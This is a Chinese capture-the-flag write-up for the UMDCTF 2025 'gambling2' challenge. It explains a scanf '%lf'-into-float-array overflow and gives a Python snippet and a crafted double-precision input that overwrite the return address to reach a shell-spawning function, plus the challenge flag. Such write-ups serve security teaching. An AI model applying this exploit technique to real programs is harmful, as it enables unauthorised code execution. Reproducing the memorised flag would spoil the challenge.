# UMDCTF 2025 - gambling2

## 题目简述

程序声明了四个 `float`，却用七个 `%lf` 读取输入：

```c
float f[4];
scanf(" %lf %lf %lf %lf %lf %lf %lf",
      f, f + 1, f + 2, f + 3, f + 4, f + 5, f + 6);
```

`%lf` 要求目标是 `double *`，每次会写 8 字节；`f + 1` 却只向后移动 4 字节。
这既造成连续的重叠写，也让后三次输入越过数组边界。二进制为 32 位、无 Canary、
无 PIE，并保留了执行 `system("/bin/sh")` 的 `print_money()`。

## 解题过程

`print_money()` 的固定地址是 `0x080492c0`。根据 `gamble` 的栈布局，
`f[0]` 位于返回地址前 28 字节，而第七个参数 `f + 6` 位于返回地址前 4 字节。
因此第七次 `%lf` 的 8 字节写入会同时覆盖返回地址前的一个字和 4 字节返回地址。

目标是构造一个 IEEE-754 双精度数，使其 64 位位模式的上下两个 32 位部分均为
`print_money()`：

```python
from struct import pack, unpack

win = 0x080492c0
bits = pack("<II", win, win)
value = unpack("<d", bits)[0]

print(repr(value))
# 4.867843942368668e-270
```

该数的精确位模式为：

```text
0x080492c0080492c0
```

前六个位置填入普通的 `1`，最后输入这个双精度数即可：

```text
1 1 1 1 1 1 4.867843942368668e-270
```

`scanf` 接受科学计数法，并把最后一个文本数还原为上述 64 位数据。`gamble`
返回时，EIP 被改为 `0x080492c0`，于是进入 `print_money()` 并获得 shell。
读取 flag 得到：

```text
UMDCTF{99_percent_of_pwners_quit_before_they_get_a_shell_congrats_on_being_the_1_percent}
```

## 方法总结

格式串中的类型宽度必须和实参指针完全一致；`%f` 对应 `float *`，`%lf` 对应
`double *`。本题把这种类型错误转化为 4 字节步长、8 字节宽度的重叠写，再利用
无 PIE 的固定函数地址完成 ret2win。十进制浮点输入看似不适合写地址，但只要按
IEEE-754 位模式反向构造一个可被 `scanf` 精确解析的数，它同样可以承载控制流数据。
